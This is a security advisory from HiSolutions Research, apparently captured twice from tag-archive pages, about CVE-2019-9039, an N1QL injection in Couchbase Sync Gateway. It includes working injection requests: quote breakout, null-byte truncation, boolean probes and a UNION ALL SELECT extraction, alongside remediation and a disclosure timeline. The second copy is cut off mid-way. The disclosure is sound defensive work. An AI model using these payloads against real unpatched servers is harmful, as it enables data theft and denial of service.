=== Content from research.hisolutions.com_a0703b11_20250121_012417.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Schlagwort: Couchbase

[![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_6503ac59_20250121_012452.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Schlagwort: Advisory

[![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
